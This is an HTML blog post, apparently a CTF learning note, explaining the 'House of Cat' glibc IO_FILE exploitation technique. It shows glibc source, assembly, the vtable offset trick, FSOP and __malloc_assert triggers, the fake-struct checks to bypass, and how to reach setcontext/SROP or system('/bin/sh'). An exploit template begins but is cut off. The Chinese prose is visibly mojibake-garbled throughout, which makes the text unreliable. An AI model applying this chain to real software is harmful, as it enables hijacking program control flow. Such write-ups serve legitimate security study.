    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>House of Catåˆ©ç”¨äº†House of emmaçš„è™šè¡¨åç§»ä¿®æ”¹æ€æƒ³ï¼Œé€šè¿‡ä¿®æ”¹è™šè¡¨æŒ‡é’ˆçš„åç§»ï¼Œé¿å…äº†å¯¹éœ€è¦ç»•è¿‡TLSä¸Š <strong>_pointer_chk_guard</strong>çš„æ£€æµ‹ç›¸å…³çš„IOå‡½æ•°çš„è°ƒç”¨ï¼Œè½¬è€Œè°ƒç”¨**_IO_wfile_jumps<strong>ä¸­çš„</strong>_IO_wfile_seekoff<strong>å‡½æ•°ï¼Œç„¶åè¿›å…¥åˆ°</strong>_IO_switch_to_wget_mode<strong>å‡½æ•°ä¸­æ¥æ”»å‡»ï¼Œä»è€Œä½¿å¾—æ”»å‡»æ¡ä»¶å’Œåˆ©ç”¨å˜å¾—æ›´ä¸ºç®€å•ã€‚å¹¶ä¸”house of catåœ¨</strong>FSOP<strong>çš„æƒ…å†µä¸‹ä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œåªéœ€ä¿®æ”¹è™šè¡¨æŒ‡é’ˆçš„åç§»æ¥è°ƒç”¨</strong>_IO_wfile_seekoff<strong>å³å¯ï¼ˆé€šå¸¸æ˜¯ç»“åˆ</strong>__malloc_assert<strong>ï¼Œæ”¹vtableä¸º</strong>_IO_wfile_jumps+0x10**ï¼‰ã€‚</p><blockquote><p>æœ¬æ–‡ä¸ºå¯¹CatF1yå¤§ä½¬æå‡ºçš„IO_FILEè°ƒç”¨é“¾çš„å­¦ä¹ ï¼ŒåŸæ–‡é“¾æ¥ï¼š<a href="https://bbs.pediy.com/thread-273895.htm#msg_header_h1_0">House of catæ–°å‹glibcä¸­IOåˆ©ç”¨æ‰‹æ³•è§£æ &amp;&amp; ç¬¬å…­å±Šå¼ºç½‘æ¯House of catè¯¦è§£</a></p></blockquote><h2 id="åŸç†ç®€ä»‹"><a href="#åŸç†ç®€ä»‹" class="headerlink" title="åŸç†ç®€ä»‹"></a>åŸç†ç®€ä»‹</h2><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>èƒ½å¤Ÿä»»æ„å†™ä¸€ä¸ªå¯æ§åœ°å€ï¼ˆå¦‚large bin attackçš„ä»»æ„å†™å †åœ°å€ï¼‰</li><li>èƒ½å¤Ÿæ³„éœ²libcå’Œå †åœ°å€</li><li>èƒ½å¤Ÿè§¦å‘IOæµï¼ˆFSOPæˆ–è§¦å‘__malloc_assertï¼Œæˆ–è€…ç¨‹åºä¸­å­˜åœ¨putsç­‰èƒ½è¿›å…¥IOé“¾çš„å‡½æ•°ï¼‰ï¼Œæ‰§è¡ŒIOç›¸å…³å‡½æ•°ã€‚</li></ul><h3 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><h4 id="IO-FILEç»“æ„åŠåˆ©ç”¨"><a href="#IO-FILEç»“æ„åŠåˆ©ç”¨" class="headerlink" title="IO_FILEç»“æ„åŠåˆ©ç”¨"></a>IO_FILEç»“æ„åŠåˆ©ç”¨</h4><p>åœ¨é«˜ç‰ˆæœ¬libcä¸­ï¼Œå½“æ”»å‡»æ¡ä»¶æœ‰é™ï¼ˆå¦‚ä¸èƒ½é€ æˆä»»æ„åœ°å€å†™ï¼‰æˆ–è€…libcç‰ˆæœ¬ä¸­æ— hookå‡½æ•°ï¼ˆlibc2.34åŠä»¥åï¼‰æ—¶ï¼Œä¼ªé€ fake_IOè¿›è¡Œæ”»å‡»æ˜¯ä¸€ç§å¸¸è§å¯è¡Œçš„æ”»å‡»æ–¹å¼ï¼Œå¸¸è§çš„è§¦å‘IOå‡½æ•°çš„æ–¹å¼æœ‰FSOPã€__malloc_assertï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ç”¨putsç­‰å‡½æ•°ï¼Œåªä¸è¿‡éœ€è¦ä»»æ„åœ°å€å†™ä»»æ„å€¼ç›´æ¥æ”¹æ‰libcä¸­çš„stdoutç»“æ„ä½“ï¼‰ï¼Œå½“è¿›å…¥IOæµæ—¶ä¼šæ ¹æ®vtableæŒ‡é’ˆè°ƒç”¨ç›¸å…³çš„IOå‡½æ•°ï¼Œå¦‚æœåœ¨é¢˜ç›®ä¸­é€ æˆä»»æ„åœ°å€å†™ä¸€ä¸ªå¯æ§åœ°å€ï¼ˆå¦‚large bin attackã€tcache stashing unlink attackã€fastbin reverse into tcacheï¼‰ï¼Œç„¶åä¼ªé€ fake_IOç»“æ„ä½“é…åˆæ°å½“çš„IOè°ƒç”¨é“¾ï¼Œå¯ä»¥è¾¾åˆ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„æ•ˆæœã€‚</p><h4 id="vatableæ£€æŸ¥"><a href="#vatableæ£€æŸ¥" class="headerlink" title="vatableæ£€æŸ¥"></a>vatableæ£€æŸ¥</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> _IO_vtable_check (<span class="hljs-type">void</span>) attribute_hidden;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;<br>  <span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr -(<span class="hljs-type">uintptr_t</span>)__start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶æ£€æŸ¥æµç¨‹ä¸ºï¼šè®¡ç®—**_IO_vtable æ®µçš„é•¿åº¦ï¼ˆsection_length)<strong>ï¼Œç”¨å½“å‰è™šè¡¨æŒ‡é’ˆçš„åœ°å€å‡å»</strong>_IO_vtable æ®µçš„å¼€å§‹åœ°å€<strong>ï¼Œå¦‚æœvtableç›¸å¯¹äºå¼€å§‹åœ°å€çš„åç§»å¤§äºç­‰äº</strong>section_length<strong>ï¼Œé‚£ä¹ˆå°±ä¼šè¿›å…¥</strong>_IO_vtable_check<strong>è¿›è¡Œæ›´è¯¦ç»†çš„æ£€æŸ¥ï¼Œå¦åˆ™çš„è¯ä¼šæ­£å¸¸è°ƒç”¨ã€‚å¦‚æœvtableæ˜¯éæ³•çš„ï¼Œè¿›å…¥</strong>_IO_vtable_check**å‡½æ•°åä¼šè§¦å‘<code>abort</code>ã€‚</p><p>ä½†åŒæ—¶æˆ‘ä»¬æ³¨æ„åˆ°ä¸€ä»¶äº‹ï¼Œè¿™é‡Œå¯¹äºvtableçš„åœ°å€æ£€æŸ¥å¹¶éæ˜¯å…·ä½“åœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªèŒƒå›´ã€‚è¿™æ ·å°±ç»™äº†æ”»å‡»è€…å¯æ“ä½œçš„ç©ºé—´ï¼Œå¯ä»¥ä¿®æ”¹vtableæŒ‡é’ˆä¸ºè™šè¡¨æ®µå†…çš„ä»»æ„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯å¯¹äºæŸä¸€ä¸ª**_IO_xxx_jumps**çš„ä»»æ„åç§»ï¼Œä½¿å¾—å…¶è°ƒç”¨æ”»å‡»è€…æƒ³è¦è°ƒç”¨çš„IOå‡½æ•°ã€‚</p><h4 id="malloc-assertä¸FSOP"><a href="#malloc-assertä¸FSOP" class="headerlink" title="__malloc_assertä¸FSOP"></a>__malloc_assertä¸FSOP</h4><p>åœ¨glibcä¸­å­˜åœ¨ä¸€ä¸ªå‡½æ•°<code>_malloc_assert</code>ï¼Œå…¶ä¸­ä¼šæ ¹æ®vtableè¡¨å¦‚<code>_IO_xxx_jumps</code>è°ƒç”¨IOç­‰ç›¸å…³å‡½æ•°ï¼›è¯¥å‡½æ•°æœ€ç»ˆä¼šæ ¹æ®stderrè¿™ä¸ªIOç»“æ„ä½“è¿›è¡Œç›¸å…³çš„IOæ“ä½œ</p><p><img src="/img/article/house_of_cat/image-20221113210513266.png" alt="image-20221113210513266"></p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>         <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>             __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>             file, line,<br>             function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>             assertion);<br>  fflush (<span class="hljs-built_in">stderr</span>);<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure><p>[house of kiwi]([ã€IO_FILEã€‘House of kiwi - é·ºé›¨ã®Blog (loora1n.github.io)](<a href="https://loora1n.github.io/2022/10/27/[IO_FILE]House">https://loora1n.github.io/2022/10/27/[IO_FILE]House</a> of kiwi&#x2F;))æä¾›äº†ä¸€ç§è°ƒç”¨è¯¥å‡½æ•°çš„æ€è·¯ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹topchunkçš„å¤§å°è§¦å‘ï¼Œå³æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ä¸­çš„ä¸€ä¸ª</p><blockquote><p>1.topchunkçš„å¤§å°å°äºMINSIZE(0X20)<br>2.prev inuseä½ä¸º0<br>3.old_topé¡µæœªå¯¹é½</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>ä¸‹é¢ä»‹ç»å¦ä¸€ç§è§¦å‘house of catçš„æ–¹å¼FSOP:</p><p>ç¨‹åºä¸­æ‰€æœ‰çš„<code>_IO_FILE </code>ç»“æ„ç”¨<code>_chain</code>è¿æ¥å½¢æˆä¸€ä¸ªå•é“¾è¡¨ï¼Œé“¾è¡¨çš„å¤´éƒ¨åˆ™æ˜¯<code>_IO_list_all</code></p><p>FSOPå°±æ˜¯é€šè¿‡åŠ«æŒ<code>_IO_list_all</code>çš„å€¼ï¼ˆå¦‚large bin attackä¿®æ”¹ï¼‰æ¥æ‰§è¡Œ<code>_IO_flush_all_lockp</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®<code>_IO_list_all</code>åˆ·æ–°é“¾è¡¨ä¸­çš„æ‰€æœ‰æ–‡ä»¶æµï¼Œåœ¨libcä¸­ä»£ç å¦‚ä¸‹ï¼Œå…¶ä¸­ä¼šè°ƒç”¨vtableä¸­çš„IOå‡½æ•°_IO_OVERFLOWï¼Œæ ¹æ®æˆ‘ä»¬ä¸Šé¢æ‰€è¯´çš„è™šè¡¨åç§»å¯å˜æ€æƒ³ï¼Œè¿™ä¸ªåœ°æ–¹çš„è™šè¡¨åç§»ä¹Ÿæ˜¯å¯ä¿®æ”¹çš„ï¼Œç„¶åé…åˆä¼ªé€ IOç»“æ„ä½“å¯ä»¥æ‰§è¡Œhouse of catçš„è°ƒç”¨é“¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  ...<br>  fp = (_IO_FILE *) _IO_list_all;<br>  <span class="hljs-keyword">while</span> (fp != <span class="hljs-literal">NULL</span>)<br>  &#123;<br>       ...<br>       <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))<br>               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>           &#123;<br>               result = EOF;<br>          &#125;<br>        ...<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§¦å‘æ¡ä»¶åˆ™æ˜¯æœ‰ä¸‰ç§æƒ…å†µ</p><blockquote><p>FSOPæœ‰ä¸‰ç§æƒ…å†µï¼ˆèƒ½ä»mainå‡½æ•°ä¸­è¿”å›ã€ç¨‹åºä¸­èƒ½æ‰§è¡Œexitå‡½æ•°ã€libcä¸­æ‰§è¡Œabortï¼‰ï¼Œç¬¬ä¸‰ç§æƒ…å†µåœ¨é«˜ç‰ˆæœ¬ä¸­å·²ç»åˆ é™¤;__malloc_assertåˆ™æ˜¯åœ¨mallocä¸­è§¦å‘ï¼Œé€šå¸¸æ˜¯ä¿®æ”¹top chunkçš„å¤§å°ã€‚</p></blockquote><h4 id="ä¸€ç§å¯è¡Œçš„IOè°ƒç”¨é“¾"><a href="#ä¸€ç§å¯è¡Œçš„IOè°ƒç”¨é“¾" class="headerlink" title="ä¸€ç§å¯è¡Œçš„IOè°ƒç”¨é“¾"></a>ä¸€ç§å¯è¡Œçš„IOè°ƒç”¨é“¾</h4><p>åœ¨_IO_wfile_jumpsç»“æ„ä½“ä¸­ï¼Œä¼šæ ¹æ®è™šè¡¨è¿›è¡Œç›¸å…³çš„å‡½æ•°è°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_wfile_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_new_file_finish),<br>  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),<br>  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),<br>  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),<br>  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),<br>  JUMP_INIT(xsputn, _IO_wfile_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_wfile_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),<br>  JUMP_INIT(doallocate, _IO_wfile_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­_IO_wfile_seekoffå‡½æ•°ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">off64_t</span><br>_IO_wfile_seekoff (FILE *fp, <span class="hljs-type">off64_t</span> offset, <span class="hljs-type">int</span> dir, <span class="hljs-type">int</span> mode)<br>&#123;<br>  <span class="hljs-type">off64_t</span> result;<br>  <span class="hljs-type">off64_t</span> delta, new_offset;<br>  <span class="hljs-type">long</span> <span class="hljs-type">int</span> count;<br> <br>  <span class="hljs-keyword">if</span> (mode == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> do_ftell_wide (fp);<br>  <span class="hljs-type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base<br>            == fp-&gt;_wide_data-&gt;_IO_read_end)<br>               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base<br>               == fp-&gt;_wide_data-&gt;_IO_write_ptr));<br>#éœ€è¦ç»•è¿‡was_writingçš„æ£€æµ‹<br>  <span class="hljs-type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr<br>               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br>              || _IO_in_put_mode (fp));<br> <br>  <span class="hljs-keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))<br>    <span class="hljs-keyword">return</span> WEOF;<br>......<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­fpç»“æ„ä½“æ˜¯æˆ‘ä»¬å¯ä»¥ä¼ªé€ çš„(ä¸Šé¢é‚£ä¸ªæˆªå›¾çš„rdiï¼Œä¸ºä¸€ä¸ª<strong>å †åœ°å€</strong>)ï¼Œå¯ä»¥æ§åˆ¶<strong>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</strong>æ¥è°ƒç”¨**_IO_switch_to_wget_mode**è¿™ä¸ªå‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›ä»£ç </p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">int<br>_IO_switch_to_wget_mode (FILE *fp)<br>&#123;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base)<br>    <span class="hljs-keyword">if</span> ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)<br>      return EOF;<br>  ......<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ_IO_WOVERFLOWæ˜¯glibcé‡Œå®šä¹‰çš„ä¸€ä¸ªå®è°ƒç”¨å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span><br></code></pre></td></tr></table></figure><p>å¯¹_IO_WOVERFLOWæ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æµ‹ï¼Œä¸ºäº†ä¾¿äºç†è§£ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64<br>0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]<br>0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx<br>0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi<br>0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]<br>0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]<br>0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56 &lt;_IO_switch_to_wget_mode+56&gt; <br>0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]<br>0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff<br>0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]<br></code></pre></td></tr></table></figure><p>ä¸»è¦å…³æ³¨è¿™å‡ å¥ï¼Œåšäº†ä¸€ä¸‹å‡ ç‚¹äº‹æƒ…</p><ul><li>å°†[rdi+0xa0]å¤„çš„å†…å®¹èµ‹å€¼ç»™raxï¼Œä¸ºäº†é¿å…ä¸ä¸‹é¢çš„raxæ··æ·†ï¼Œç§°ä¹‹ä¸º<strong>rax1</strong>ã€‚</li><li>å°†æ–°èµ‹å€¼çš„[rax1+0x20]å¤„çš„å†…å®¹èµ‹å€¼ç»™rdxã€‚</li><li>å°†[rax1+0xe0]å¤„çš„å†…å®¹èµ‹å€¼ç»™raxï¼Œç§°ä¹‹ä¸º<strong>rax2</strong>ã€‚</li><li>callè°ƒç”¨[rax2+0x18]å¤„çš„å†…å®¹ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]<br>0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]<br>0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]<br>0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]<br></code></pre></td></tr></table></figure><p>è€Œrdiç°åœ¨æ˜¯ä»€ä¹ˆçŠ¶æ€å‘¢ï¼Ÿgdbè°ƒè¯•æ¥çœ‹çœ‹</p><p><img src="/img/article/house_of_cat/image-20221113211825072.png" alt="image-20221113211825072"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªå †åœ°å€ï¼Œè€Œå®é™…ä¸Šæ­¤æ—¶rdiå°±æ˜¯ä¼ªé€ çš„IOç»“æ„ä½“çš„åœ°å€ï¼Œå³<strong>ä¹‹å‰__IO_wfile_seekoffå‡½æ•°ä¼ å…¥é‚£ä¸ªfp</strong>ï¼Œä¹Ÿæ˜¯å¯æ§çš„ã€‚</p><p>åœ¨é€ æˆä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€çš„åŸºç¡€ä¸Šï¼Œè¿™é‡Œçš„å¯„å­˜å™¨rdiï¼ˆfake_IOçš„åœ°å€ï¼‰ã€raxå’Œrdxéƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œåœ¨<strong>å¼€å¯æ²™ç®±</strong>çš„æƒ…å†µä¸‹ï¼Œå‡å¦‚æŠŠæœ€åè°ƒç”¨çš„**[rax + 0x18]è®¾ç½®ä¸ºsetcontextï¼ŒæŠŠrdxè®¾ç½®ä¸ºå¯æ§çš„å †åœ°å€ï¼Œå°±èƒ½æ‰§è¡Œsropæ¥è¯»å–flag<strong>ï¼›å¦‚æœ</strong>æœªå¼€å¯æ²™ç®±<strong>ï¼Œåˆ™åªéœ€æŠŠ</strong>æœ€åè°ƒç”¨çš„[rax + 0x18]è®¾ç½®ä¸ºsystemå‡½æ•°ï¼ŒæŠŠfake_IOçš„å¤´éƒ¨å†™å…¥&#x2F;bin&#x2F;shå­—ç¬¦ä¸²**ï¼Œå°±å¯æ‰§è¡Œsystem(â€œ&#x2F;bin&#x2F;shâ€)</p><h4 id="fake-IOç»“æ„ä½“éœ€è¦ç»•è¿‡çš„æ£€æµ‹"><a href="#fake-IOç»“æ„ä½“éœ€è¦ç»•è¿‡çš„æ£€æµ‹" class="headerlink" title="fake_IOç»“æ„ä½“éœ€è¦ç»•è¿‡çš„æ£€æµ‹"></a>fake_IOç»“æ„ä½“éœ€è¦ç»•è¿‡çš„æ£€æµ‹</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_wide_data-&gt;_IO_read_ptr ï¼= _wide_data-&gt;_IO_read_end<br>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base<br><span class="hljs-comment">/*å¦‚æœ_wide_data=fake_io_addr+0x30ï¼Œå…¶å®ä¹Ÿå°±æ˜¯fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="hljs-comment">fp-&gt;_lockæ˜¯ä¸€ä¸ªå¯å†™åœ°å€ï¼ˆå †åœ°å€libcä¸­çš„å¯å†™åœ°å€ï¼‰*/</span><br></code></pre></td></tr></table></figure><h4 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h4><p><img src="/img/article/house_of_cat/959842_JDJKTRK7GJUEUFR.png" alt="æ”»å‡»æµç¨‹å›¾"></p><h4 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h4><p>house of catçš„æ¨¡æ¿ï¼ŒåŸç†å‚ç…§ä¸Šå›¾ã€‚ä¼ªé€ IOç»“æ„ä½“æ—¶åªéœ€ä¿®æ”¹<strong>fake_io_addr</strong>åœ°å€ï¼Œ**_IO_save_end<strong>ä¸ºæƒ³è¦è°ƒç”¨çš„å‡½æ•°ï¼Œ</strong>_IO_backup_base**ä¸ºæ‰§è¡Œå‡½æ•°æ—¶çš„rdxï¼Œä»¥åŠä¿®æ”¹_flagsä¸ºæ‰§è¡Œå‡½æ•°æ—¶çš„rdi;FSOPå’Œåˆ©ç”¨__malloc_assertè§¦å‘house of catçš„æƒ…å†µä¸åŒï¼Œéœ€è¦å…·ä½“é—®é¢˜å…·ä½“è°ƒæ•´ï¼ˆFSOPéœ€å°†vtableæ”¹ä¸ºIO_wfile_jumps+0x30ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 